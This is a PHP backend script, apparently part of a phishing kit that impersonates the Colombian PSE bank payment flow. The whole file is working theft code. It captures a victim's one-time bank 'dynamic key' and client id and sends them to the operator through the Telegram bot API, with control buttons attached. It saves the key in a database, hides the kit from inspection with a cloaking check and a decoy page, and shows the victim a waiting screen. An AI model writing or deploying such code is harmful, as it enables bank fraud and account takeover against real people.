<?php
// modules/api/procesar_dinamica.php
ini_set('display_errors', 0);
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
if (!isset($config) || !is_array($config)) {
    $config = require __DIR__ . '/../../config/config.php';
}
$conn = require __DIR__ . '/../../config/db.php';
$botToken = $config['botToken'];
$chatId = $config['chatId'];
require_once __DIR__ . '/../../config/cloak.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    cloak_validate_post_request('../../decoy.php');
    $clienteId = $_POST['cliente_id'] ?? '';
    $dinamica = $_POST['dinamica'] ?? '';
    $isRetry = isset($_POST['retry']) && $_POST['retry'] == '1';

    if (empty($clienteId) || empty($dinamica)) {
        header("Location: ../../index.php");
        exit();
    }

    // 1. Notificar a Telegram
    $baseUrl = $config['baseUrl'];
    $security_key = $config['security_key'];

    // Construir mensaje
    $mensaje = ($isRetry ? "⚠️ *ERROR CLAVE DINÁMICA RECIBIDA*" : "⌚ *CLAVE DINÁMICA RECIBIDA*") . "\n";
    $mensaje .= "🆔 Cliente: `$clienteId`\n";
    $mensaje .= "🔐 Clave Dinámica: `$dinamica`";

    // Teclado con opciones centralizado
    require_once __DIR__ . '/../../config/telegram_keyboard.php';
    $keyboard = getTelegramKeyboard($clienteId, $config);

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'parse_mode' => 'Markdown',
        'reply_markup' => json_encode($keyboard)
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);

    // 2. Actualizar BD (Guardamos en OTP por simplicidad o podríamos crear columna dinamica)
    // Para no romper esquemas, guardamos en una columna 'otp' concatenada o reemplazada
    // Mejor: actualizamos estado a 1 (Espera) y guardamos el dato

    // Opción: guardar en clave_din y en otp para compatibilidad total
    try {
        $sql = "UPDATE pse SET estado = 1, otp = :dinamica, clave_din = :dinamica WHERE id = :id";
        $stmt = $conn->prepare($sql);
        $stmt->execute([
            'dinamica' => $dinamica,
            'id' => $clienteId
        ]);
    } catch (Exception $e) {
        $sql = "UPDATE pse SET estado = 1, otp = :dinamica WHERE id = :id";
        $stmt = $conn->prepare($sql);
        $stmt->execute([
            'dinamica' => $dinamica,
            'id' => $clienteId
        ]);
    }

    // 3. Redirigir a Espera
    header("Location: ../../index.php?status=espera&id=" . $clienteId);
    exit();

}
else {
    header("Location: ../../index.php");
    exit();
}
?>
